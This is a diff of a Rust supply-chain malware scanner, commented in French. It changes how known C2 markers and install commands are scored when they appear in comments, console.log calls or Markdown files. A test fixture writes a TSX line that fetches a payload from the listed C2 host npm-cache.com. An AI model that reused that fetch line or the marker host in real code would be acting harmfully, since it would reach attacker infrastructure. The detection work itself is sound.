@@ -1,16 +1,23 @@
 //! Détection passive dans le code source : instructions d'installation directes
 //! (SPEC-F05), marqueurs C2 connus des campagnes Shai-Hulud / CHAINDROP (SPEC-F08) et
-//! secrets en clair dans les fichiers `.env*` du workspace (SPEC-F08). Pour les
-//! fichiers JS/TS/Python, une correspondance trouvée à l'intérieur d'un commentaire
-//! (`comments::comment_spans`) voit sa sévérité abaissée (`CommandFoundInComment`)
-//! plutôt que d'être traitée comme une correspondance normale. Les regex et listes de
-//! marqueurs/extensions viennent de `config: &IocsConfig` (`iocs.toml`, SPEC-F08).
+//! secrets en clair dans les fichiers `.env*` du workspace (SPEC-F08). Une
+//! correspondance trouvée dans un contexte bénin voit sa sévérité abaissée plutôt que
+//! d'être traitée comme une correspondance normale, selon trois mécanismes : pour les
+//! fichiers JS/TS/Python, à l'intérieur d'un commentaire (`comments::comment_spans`,
+//! `CommandFoundInComment`) ; pour les fichiers `.js`/`.tsx`, à l'intérieur d'un appel
+//! `console.log`/`console.error` détecté via un vrai parseur AST
+//! (`console_scan::console_log_spans`, `CommandFoundInLogStatement`) ; pour les
+//! fichiers `.md`, sur tout le fichier (`CommandFoundInDocumentation`) — un README
+//! documentant une installation ou citant un marqueur C2 pour référence n'est pas plus
+//! suspect qu'un commentaire de code. Les regex et listes de marqueurs/extensions
+//! viennent de `config: &IocsConfig` (`iocs.toml`, SPEC-F08).
 
 use std::ops::Range;
 use std::path::{Path, PathBuf};
 use std::sync::{Arc, Mutex};
 
 use crate::comments::{comment_spans, is_within_comment, language_for_path};
+use crate::console_scan::console_log_spans;
 use crate::hunt::{ThreatCategory, ThreatSignal};
 use crate::iocs::IocsConfig;
 use crate::progress::DotProgress;
@@ -30,6 +37,63 @@ pub fn find_known_c2_markers<'a>(content: &str, config: &'a IocsConfig) -> Vec<&
         .map(String::as_str)
         .filter(|marker| content.contains(marker))
         .collect()
+}
+
+fn is_markdown_file(path: &Path) -> bool {
+    path.extension()
+        .and_then(|ext| ext.to_str())
+        .is_some_and(|ext| ext.eq_ignore_ascii_case("md"))
+}
+
+/// Contexte d'une correspondance sensible, du plus au moins sévère.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum MatchContext {
+    /// Trouvée dans du code effectivement exécuté (ou un fichier hors de portée des
+    /// mécanismes de nuance ci-dessous) : sévérité normale.
+    Code,
+    /// Toutes les occurrences sont dans un commentaire de code (SPEC-F05).
+    Comment,
+    /// Aucune occurrence en code réel, au moins une dans un appel
+    /// `console.log`/`console.error` (le reste en commentaire).
+    ConsoleLog,
+    /// Fichier `.md` : tout le fichier est considéré comme de la documentation.
+    Documentation,
+}
+
+/// Classe un ensemble d'occurrences `[start, end)` d'une même correspondance sensible
+/// selon le contexte le plus sévère rencontré (SPEC-F05/F08) : une seule occurrence en
+/// code réel (hors commentaire et hors `console.log`/`console.error`) suffit à garder
+/// la sévérité normale, même si d'autres occurrences sont bénignes.
+fn classify_occurrences(
+    occurrences: impl Iterator<Item = (usize, usize)>,
+    comment_spans: Option<&[Range<usize>]>,
+    console_spans: &[Range<usize>],
+    is_markdown: bool,
+) -> MatchContext {
+    if is_markdown {
+        return MatchContext::Documentation;
+    }
+
+    let mut all_in_comment = true;
+    let mut all_in_comment_or_console = true;
+    for (start, end) in occurrences {
+        let in_comment = comment_spans.is_some_and(|spans| is_within_comment(spans, start, end));
+        let in_console = is_within_comment(console_spans, start, end);
+        if !in_comment {
+            all_in_comment = false;
+        }
+        if !(in_comment || in_console) {
+            all_in_comment_or_console = false;
+        }
+    }
+
+    if all_in_comment {
+        MatchContext::Comment
+    } else if all_in_comment_or_console {
+        MatchContext::ConsoleLog
+    } else {
+        MatchContext::Code
+    }
 }
 
 fn is_excluded(path: &Path, config: &IocsConfig) -> bool {
@@ -54,35 +118,44 @@ fn install_command_matches(content: &str, config: &IocsConfig) -> Vec<(usize, us
         .collect()
 }
 
-/// Classe chaque marqueur C2 trouvé dans `content` selon qu'au moins une occurrence se
-/// trouve hors d'un commentaire (`in_code`, sévérité normale) ou que **toutes** ses
-/// occurrences sont dans un commentaire (`in_comment_only`, sévérité abaissée,
-/// SPEC-F05/F08). `spans` vaut `None` pour les extensions non couvertes par le lexer
-/// (`comments::language_for_path`), auquel cas tout marqueur trouvé reste `in_code`
-/// (comportement historique, inchangé).
+/// Résultat de la classification des marqueurs C2 trouvés dans un fichier, par
+/// contexte le plus sévère rencontré (SPEC-F05/F08, voir [`MatchContext`]).
+#[derive(Debug, Default)]
+struct ClassifiedC2Markers<'a> {
+    in_code: Vec<&'a str>,
+    in_comment_only: Vec<&'a str>,
+    in_console_log_only: Vec<&'a str>,
+    in_documentation_only: Vec<&'a str>,
+}
+
+/// Classe chaque marqueur C2 trouvé dans `content` selon le contexte le plus sévère
+/// parmi ses occurrences (voir [`classify_occurrences`]/[`MatchContext`]). `spans` vaut
+/// `None` pour les extensions non couvertes par le lexer de commentaires
+/// (`comments::language_for_path`) ; `console_spans` est vide hors fichiers `.js`/
+/// `.tsx` ; `is_markdown` court-circuite les deux au profit d'un classement
+/// "documentation" pour tout le fichier.
 fn classify_c2_markers<'a>(
     content: &str,
     config: &'a IocsConfig,
     spans: Option<&[Range<usize>]>,
-) -> (Vec<&'a str>, Vec<&'a str>) {
-    let mut in_code = Vec::new();
-    let mut in_comment_only = Vec::new();
+    console_spans: &[Range<usize>],
+    is_markdown: bool,
+) -> ClassifiedC2Markers<'a> {
+    let mut result = ClassifiedC2Markers::default();
 
     for marker in find_known_c2_markers(content, config) {
-        let all_in_comment = match spans {
-            Some(spans) => content
-                .match_indices(marker)
-                .all(|(start, m)| is_within_comment(spans, start, start + m.len())),
-            None => false,
-        };
-        if all_in_comment {
-            in_comment_only.push(marker);
-        } else {
-            in_code.push(marker);
+        let occurrences = content
+            .match_indices(marker)
+            .map(|(start, m)| (start, start + m.len()));
+        match classify_occurrences(occurrences, spans, console_spans, is_markdown) {
+            MatchContext::Code => result.in_code.push(marker),
+            MatchContext::Comment => result.in_comment_only.push(marker),
+            MatchContext::ConsoleLog => result.in_console_log_only.push(marker),
+            MatchContext::Documentation => result.in_documentation_only.push(marker),
         }
     }
 
-    (in_code, in_comment_only)
+    result
 }
 
 fn is_dotenv_file(path: &Path) -> bool {
@@ -131,38 +204,67 @@ pub fn scan_file(path: &Path, config: &IocsConfig) -> Option<FileScanResult> {
     let mut result = FileScanResult::default();
 
     let spans = language_for_path(path).map(|lang| comment_spans(&content, lang));
+    let console_spans = console_log_spans(&content, path);
+    let is_markdown = is_markdown_file(path);
 
     let install_matches = install_command_matches(&content, config);
     if !install_matches.is_empty() {
-        let all_in_comment = match &spans {
-            Some(spans) => install_matches
-                .iter()
-                .all(|(start, end)| is_within_comment(spans, *start, *end)),
-            None => false,
-        };
-        // Une mention trouvée uniquement en commentaire (ex. « // npm install après
-        // clonage ») est un indice déjà bénin (Debug uniquement) rendu plus bénin
-        // encore par le contexte commentaire : ne pas la reporter du tout.
-        if !all_in_comment {
+        let all_in_benign_context = install_matches.iter().all(|(start, end)| {
+            let in_comment = spans
+                .as_deref()
+                .is_some_and(|spans| is_within_comment(spans, *start, *end));
+            let in_console = is_within_comment(&console_spans, *start, *end);
+            in_comment || in_console
+        });
+        // Une mention trouvée uniquement en commentaire ou dans un appel
+        // console.log/console.error (ex. « // npm install après clonage ») est un
+        // indice déjà bénin (Debug uniquement) rendu plus bénin encore par ce
+        // contexte : ne pas la reporter du tout.
+        if !all_in_benign_context {
             result.install_mention = Some(path.to_path_buf());
         }
     }
 
-    let (real_markers, comment_only_markers) =
-        classify_c2_markers(&content, config, spans.as_deref());
-    if !real_markers.is_empty() {
+    let markers = classify_c2_markers(
+        &content,
+        config,
+        spans.as_deref(),
+        &console_spans,
+        is_markdown,
+    );
+    if !markers.in_code.is_empty() {
         result.threat_signals.push(ThreatSignal {
             category: ThreatCategory::KnownC2Marker,
-            detail: format!("marqueur(s) C2 connu(s) : {}", real_markers.join(", ")),
+            detail: format!("marqueur(s) C2 connu(s) : {}", markers.in_code.join(", ")),
             path: path.to_path_buf(),
         });
     }
-    if !comment_only_markers.is_empty() {
+    if !markers.in_comment_only.is_empty() {
         result.threat_signals.push(ThreatSignal {
             category: ThreatCategory::CommandFoundInComment,
             detail: format!(
                 "marqueur(s) C2 connu(s) trouvé(s) uniquement en commentaire, sévérité abaissée : {}",
-                comment_only_markers.join(", ")
+                markers.in_comment_only.join(", ")
+            ),
+            path: path.to_path_buf(),
+        });
+    }
+    if !markers.in_console_log_only.is_empty() {
+        result.threat_signals.push(ThreatSignal {
+            category: ThreatCategory::CommandFoundInLogStatement,
+            detail: format!(
+                "marqueur(s) C2 connu(s) trouvé(s) uniquement dans un console.log/console.error, sévérité abaissée : {}",
+                markers.in_console_log_only.join(", ")
+            ),
+            path: path.to_path_buf(),
+        });
+    }
+    if !markers.in_documentation_only.is_empty() {
+        result.threat_signals.push(ThreatSignal {
+            category: ThreatCategory::CommandFoundInDocumentation,
+            detail: format!(
+                "marqueur(s) C2 connu(s) trouvé(s) dans un fichier de documentation (.md), sévérité abaissée : {}",
+                markers.in_documentation_only.join(", ")
             ),
             path: path.to_path_buf(),
         });
@@ -353,6 +455,62 @@ mod tests {
 
         assert_eq!(threat_signals.len(), 1);
         assert_eq!(threat_signals[0].category, ThreatCategory::KnownC2Marker);
+    }
+
+    #[test]
+    fn downgrades_a_c2_marker_found_only_inside_a_console_log_call() {
+        let config = default_config();
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("app.js"),
+            r#"console.log("blocked call to npm-cache.com");"#,
+        )
+        .unwrap();
+
+        let (threat_signals, _) = scan_workspace(dir.path(), false, &config);
+
+        assert_eq!(threat_signals.len(), 1);
+        assert_eq!(
+            threat_signals[0].category,
+            ThreatCategory::CommandFoundInLogStatement
+        );
+        assert!(threat_signals[0].detail.contains("npm-cache.com"));
+    }
+
+    #[test]
+    fn keeps_full_severity_for_a_c2_marker_found_in_a_real_call_in_a_tsx_file() {
+        let config = default_config();
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("App.tsx"),
+            "fetch('https://npm-cache.com/payload');\nexport const App = () => <div />;",
+        )
+        .unwrap();
+
+        let (threat_signals, _) = scan_workspace(dir.path(), false, &config);
+
+        assert_eq!(threat_signals.len(), 1);
+        assert_eq!(threat_signals[0].category, ThreatCategory::KnownC2Marker);
+    }
+
+    #[test]
+    fn downgrades_a_c2_marker_found_in_a_markdown_file() {
+        let config = default_config();
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("README.md"),
+            "We block requests to npm-cache.com, see our security policy.",
+        )
+        .unwrap();
+
+        let (threat_signals, _) = scan_workspace(dir.path(), false, &config);
+
+        assert_eq!(threat_signals.len(), 1);
+        assert_eq!(
+            threat_signals[0].category,
+            ThreatCategory::CommandFoundInDocumentation
+        );
+        assert!(threat_signals[0].detail.contains("npm-cache.com"));
     }
 
     #[test]
